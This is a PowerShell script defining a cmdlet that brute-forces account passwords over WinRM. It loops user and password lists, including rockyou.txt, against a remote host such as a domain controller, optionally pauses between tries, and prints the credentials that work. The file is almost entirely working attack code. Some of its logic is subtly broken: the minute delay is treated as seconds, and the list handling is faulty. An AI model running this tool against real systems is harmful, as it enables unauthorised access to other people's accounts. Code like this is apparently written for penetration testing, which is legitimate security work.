Function Test-BruteForceCredentials {
<#
.SYNOPSIS
This cmdlet was created to brute force credentials using WinRM


.DESCRIPTION
Brute force credentials of a user or list of users and a password or list of passwords on a remote or local device


.PARAMETER ComputerName
This parameter defines a single remote device to test credentials against

.PARAMETER UseSSL
This switch parameter indicates that WinRM over HTTPS should be used to test credential validation

.PARAMETER SleepSeconds
Defines the number of seconds that should pass before attempting the next set of credentials

.PARAMETER SleepMinutes
Defines the number of minutes that should pass before attempting the next set of credentials

.PARAMETER Username
This parameter defines a single username or a list of usernames against the passwords you define

.PARAMETER UserFile
This parameter defines a file containing a list of usernames

.PARAMETER Passwd
This parameter defines a single password to test against the users you define

.PARAMETER PassFile
This parameter defines a file containng a list of passwords


.EXAMPLE
Test-BruteForceCredentials -ComputerName DC01.domain.com -UseSSL -Username 'admin','administrator' -Passwd 'Password123!' -SleepMinutes 5
# This example will test the one password defined against both the admin and administrator users on the remote computer DC01.domain.com using WinRM over HTTPS with a time interval of 5 minutes between each attempt

.EXAMPLE
Test-BruteForceCredentials -ComputerName File.domain.com -UserFile C:\Temp\users.txt -PassFile C:\Temp\rockyou.txt
# This example will test every password in rockyou.txt against every username in the users.txt file without any pause between tried attempts


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.LINK
https://osbornepro.com
https://writeups.osbornepro.com
https://encrypit.osbornepro.com
https://btpssecpack.osbornepro.com
https://github.com/tobor88
https://github.com/OsbornePro
https://gitlab.com/tobor88
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.credly.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286


.INPUTS
System.String, System,Array


.OUTPUTS
PSCustomObject
#>
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$True,
                ValueFromPipeline=$True,
                ValueFromPipelineByPropertyName=$False,
                HelpMessage="`n[H] Define a device on the network to test credentials against `n[E] EXAMPLE: test.domain.com")]  # End Parameter
            [String]$ComputerName,

            [Parameter(
                Mandatory=$False
            )]  # End Parameter
            [Switch][Bool]$UseSSL,

            [Parameter(
                Mandatory=$False,
                ValueFromPipeline=$False
            )]  # End Parameter
            [Int64]$SleepSeconds,

            [Parameter(
                Mandatory=$False,
                ValueFromPipeline=$False
            )]  # End Parameter
            [Int64]$SleepMinutes,

            [Parameter(
                Mandatory=$False
            )]  # End Parameter
            [String[]]$Username,

            [Parameter(
                Mandatory=$False
            )]  # End Parameter
            [String]$UserFile,

            [Parameter(
                Mandatory=$False
            )]  # End Parameter
            [String[]]$Passwd,

            [Parameter(
                Mandatory=$False
            )]  # End Parameter
            [String]$PassFile)  # End param


    If ($PSBoundParameters.Keys -eq 'Username') {

        Write-Verbose -Message "Username ParameterSet being used"

        [Array]$UserList = $Username

    } ElseIf ($PSBoundParameters.Keys -eq 'UserFile') {

        Write-Verbose -Message "UserFile ParameterSet being used"

        $UserList = Get-Content -Path $UserFile
        ForEach ($User in $UserList) {

            $UserList += $User

        }  # End ForEach


    }  # End ElseIf


    If ($PSBoundParameters.Keys -eq 'Passwd') {

        Write-Verbose -Message "Passwd ParameterSet being used"
        [Array]$PassList = $Passwd

    } ElseIf ($PSBoundParameters.Keys -eq 'PassFile') {

        Write-Verbose -Message "PassFile ParameterSet being used"
        $PassList = Get-Content -Path $PassFile
        ForEach ($P in $PassList) {

            $Passwd += $P

        }  # End ForEach


    }  # End ElseIf

    ForEach ($U in $UserList) {

        Write-Verbose -Message "Testing passwords for $U"

        ForEach ($P in $PassList) {

            $Error.Clear()
            $Credentials = @()
            $SecurePassword = ConvertTo-SecureString -String $P -AsPlainText -Force
            $AttemptCredentials = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecurePassword)

            If ($UseSSL.IsPresent) {

                If ($PSBoundParameters.Keys -eq "SleepSeconds") {

                    Start-Sleep -Seconds $SleepSeconds

                } ElseIf ($PSBoundParameters.Keys -eq "SleepMinutes") {

                    Start-Sleep -Seconds $SleepMinutes

                }  # End If ElseIf

                $Result = Test-WSMan -UseSSL -ComputerName $ComputerName -Credential $AttemptCredentials -Authentication Negotiate -ErrorAction SilentlyContinue

            } Else {

                If ($PSBoundParameters.Keys -eq "SleepSeconds") {

                    Start-Sleep -Seconds $SleepSeconds

                } ElseIf ($PSBoundParameters.Keys -eq "SleepMinutes") {

                    Start-Sleep -Seconds $SleepMinutes

                }  # End If ElseIf

                $Result = Test-WSMan -ComputerName $ComputerName -Credential $AttemptCredentials -Authentication Negotiate -ErrorAction SilentlyContinue

            }  # End If Else

           If ($Null -eq $Result) {

                Write-Verbose -Message "[*] Testing Password: $P = Failed"

            } Else {

                $Credentials += "USER: $U`nPASS: $P`n"
                Write-Output -InputObject "SUCCESS: `n$Credentials`n"

            }  # End If Else

        }  # End ForEach

    }  # End ForEach

    If ($Null -eq $Credentials) {

        Write-Output -InputObject "FAILED: None of the defined passwords were found to be correct"

    }  # End Else

}  # End Function Test-BruteForceCredentials
